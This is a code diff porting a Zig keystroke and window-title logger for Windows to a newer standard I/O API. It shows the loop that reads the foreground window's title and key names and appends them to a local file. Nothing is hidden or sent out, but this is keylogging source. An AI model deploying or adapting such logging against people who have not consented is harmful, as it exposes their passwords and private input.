@@ -1,15 +1,13 @@
-const VERSION = "2.2.0-dev";
+const VERSION = "2.2.0-dev.1";
 const std = @import("std");
-const File = std.fs.File;
+const Clock = std.Io.Clock;
+const File = std.Io.File;
 const Writer = std.Io.Writer;
 const Allocator = std.mem.Allocator;
-const ArenaAllocator = std.heap.ArenaAllocator;
 const ArrayList = std.ArrayList;
-const sleep = std.Thread.sleep;
+const timestamp = std.Io.Timestamp.now;
+const cwd = std.Io.Dir.cwd;
 const eql = std.mem.eql;
-const argsAlloc = std.process.argsAlloc;
-const argsWithAllocator = std.process.argsWithAllocator;
-const argsFree = std.process.argsFree;
 const print = std.debug.print;
 const f = std.fmt.bufPrint;
 const cTime = @cImport(@cInclude("time.h"));
@@ -24,19 +22,16 @@ const PrevType = enum {
     key,
 };
 
-pub fn main() !void {
-    var arena = ArenaAllocator.init(std.heap.page_allocator);
-    defer arena.deinit();
-    const allocator = arena.allocator();
+pub fn main(init: std.process.Init) !void {
+    const minimal = init.minimal;
+    const allocator = init.arena.allocator();
 
-    var stdout_buffer: [1024]u8 = undefined;
-    var stdout_writer = File.stdout().writer(&stdout_buffer);
+    const stdout_buffer = try allocator.alloc(u8, 1024);
+    defer allocator.free(stdout_buffer);
+    var stdout_writer = File.stdout().writer(init.io, stdout_buffer);
     const stdout = &stdout_writer.interface;
 
-    const args = try argsAlloc(allocator);
-    defer argsFree(allocator, args);
-
-    var args_iter = try argsWithAllocator(allocator);
+    var args_iter = minimal.args.iterate();
     defer args_iter.deinit();
     _ = args_iter.next();
 
@@ -71,7 +66,8 @@ pub fn main() !void {
 
     if (arg_output_path.items.len == 0) {
         if (arg_use_date) {
-            const now = std.time.timestamp();
+            const clock: Clock = .real;
+            const now = clock.now(init.io).toSeconds();
             const localtime = cTime.localtime(&now);
 
             var output_path_b: [1024]u8 = undefined;
@@ -97,12 +93,17 @@ pub fn main() !void {
         try stdout.flush();
     }
 
-    const dir = std.fs.cwd();
-    var file = try dir.createFile(arg_output_path.items, .{
+    var file = try cwd().createFile(init.io, arg_output_path.items, .{
         .truncate = false,
     });
-    defer file.close(); // Actually never reached because of while(true).
+    defer file.close(init.io); // Actually never reached because of while(true) later below.
+
     try file.seekFromEnd(0); // Append to end.
+
+    const writer_buf = try allocator.alloc(u8, 1024);
+    defer allocator.free(writer_buf);
+    var writer_io = file.writer(init.io, writer_buf);
+    const writer = &writer_io.interface;
 
     const title_len: usize = 1024;
     const title_len_i: c_uint = @intCast(title_len - 1);
@@ -118,7 +119,7 @@ pub fn main() !void {
 
     var prev_type: PrevType = .init;
     while (true) {
-        sleep(arg_sleep);
+        init.io.sleep(arg_sleep);
 
         const hwnd: cWindows.HWND = cWindows.GetForegroundWindow();
         const ctitle_len = cWindows.GetWindowTextA(hwnd, ctitle_b.ptr, title_len_i);
@@ -132,15 +133,15 @@ pub fn main() !void {
             switch (prev_type) {
                 .init => {
                     if (file_exists) {
-                        try file.writeAll("\n");
+                        try writer.writeAll("\n");
                     }
                 },
                 .window => {},
-                .key => try file.writeAll("\n"),
+                .key => try writer.writeAll("\n"),
             }
-            try file.writeAll("window: '");
-            try file.writeAll(ctitle_s);
-            try file.writeAll("'\n");
+            try writer.writeAll("window: '");
+            try writer.writeAll(ctitle_s);
+            try writer.writeAll("'\n");
             @memcpy(ptitle_b, ctitle_b);
             prev_type = .window;
         }
@@ -153,11 +154,12 @@ pub fn main() !void {
                 if (arg_verbose >= 1) {
                     print("key: '{s}' ({d})\n", .{ key_name_s, key_i });
                 }
-                try file.writeAll(key_name_s);
+                try writer.writeAll(key_name_s);
                 prev_type = .key;
             }
         }
     }
+    try writer.flush();
 }
 
 fn printHeader(stdout: *Writer) !void {
